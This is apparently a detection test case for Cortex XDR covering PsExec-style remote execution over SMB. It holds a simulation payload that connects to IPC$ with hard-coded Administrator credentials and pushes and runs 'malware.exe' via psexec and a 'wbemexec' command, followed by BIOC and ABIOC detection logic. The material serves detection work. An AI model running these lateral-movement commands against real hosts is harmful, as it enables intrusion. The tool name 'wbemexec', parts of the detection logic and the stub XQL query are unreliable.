identity.name: Remote PsExec-like command execution via SMB
identity.summary: An attacker uses PsExec-like techniques to execute commands remotely via SMB, leveraging Windows built-in tools to establish persistence and execute payloads. Cortex should detect the use of psexec, w
identity.description: An attacker uses PsExec-like techniques to execute commands remotely via SMB, leveraging Windows built-in tools to establish persistence and execute payloads. Cortex should detect the use of psexec, wbemexec, or similar remote execution mechanisms.

payload.code:
net use \\192.0.2.10\IPC$ /user:Administrator "Password123!"

psexec \\192.0.2.10 -u Administrator -p "Password123!" -c -f C:\\temp\\malware.exe

wbemexec \\192.0.2.10 -u Administrator -p "Password123!" -c "cmd /c calc.exe"

net use \\192.0.2.10\IPC$ /delete

expected_artifacts.description: Execution of malware on remote host

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: PsExec-like remote process execution
biocs.description: Detection of process execution using PsExec-like tools
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'psexec.exe' or action_process_image_name = 'wbemexec.exe'
| filter causality_actor_process_image_name = 'net.exe' or causality_actor_process_image_name = 'cmd.exe'

abiocs.name: Remote SMB-based execution
abiocs.description: Behavioral deviation from normal SMB usage to execute remote processes
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.NETWORK_CONNECTION
| filter dst_ip = '192.0.2.10' and dst_port = 445
| filter action_remote_ip = '192.0.2.10'
| filter causality_actor_process_image_name = 'psexec.exe' or causality_actor_process_image_name = 'wbemexec.exe'

xql_queries.name: Detect PsExec-like execution
xql_queries.query:
dataset = xdr_data
